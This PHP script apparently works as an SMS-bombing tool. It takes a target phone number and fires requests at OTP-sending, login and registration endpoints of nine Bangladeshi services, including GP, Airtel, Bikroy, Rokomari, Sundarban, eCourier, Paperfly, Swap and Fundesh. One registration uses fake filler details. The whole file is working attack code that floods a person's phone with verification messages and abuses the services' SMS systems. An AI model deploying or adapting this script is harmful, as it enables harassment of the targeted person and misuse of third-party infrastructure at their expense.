<?php
header("Content-Type: application/json");

// Helper function (POST)
function send_post($url, $payload) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if ($error) {
        return ["status" => "error", "message" => $error];
    } else {
        return json_decode($response, true) ?: $response;
    }
}

// Helper function (GET)
function send_get($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);
    if ($error) {
        return ["status" => "error", "message" => $error];
    } else {
        return json_decode($response, true) ?: $response;
    }
}

// Input
$data = json_decode(file_get_contents("php://input"), true);
$number = $data["number"] ?? null;

if (!$number) {
    echo json_encode(["error" => "Phone number required"]);
    exit;
}

// All services
$results = [];

// GP
$results["gp"] = send_post("https://cokestudio23.sslwireless.com/api/check-gp-number", ["msisdn" => $number]);

// Airtel
$results["airtel"] = send_post("https://api.bd.airtel.com/v1/account/login/otp", ["phone_number" => $number]);

// Bikroy
$results["bikroy"] = send_get("https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . $number);

// Rokomari
$results["rokomari"] = send_get("https://www.rokomari.com/otp/send?emailOrPhone=880" . $number . "&countryCode=BD");

// Sundarban
$results["sundarban"] = send_post("https://tracking.sundarbancourierltd.com/PreBooking/SendPin", ["PreBookingRegistrationPhoneNumber" => $number]);

// eCourier
$results["ecourier"] = send_get("https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=" . $number);

// Paperfly
$results["paperfly"] = send_post("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", [
    "full_name" => "Test User",
    "company_name" => "ShadowJoker",
    "email_address" => "demo@example.com",
    "phone_number" => $number
]);

// Swap
$results["swap"] = send_post("https://api.swap.com.bd/api/v1/send-otp", ["phone" => $number]);

// Fundesh
$results["fundesh"] = send_post("https://fundesh.com.bd/api/auth/generateOTP?service_key=", ["msisdn" => $number]);

echo json_encode([
    "number" => $number,
    "results" => $results
], JSON_PRETTY_PRINT);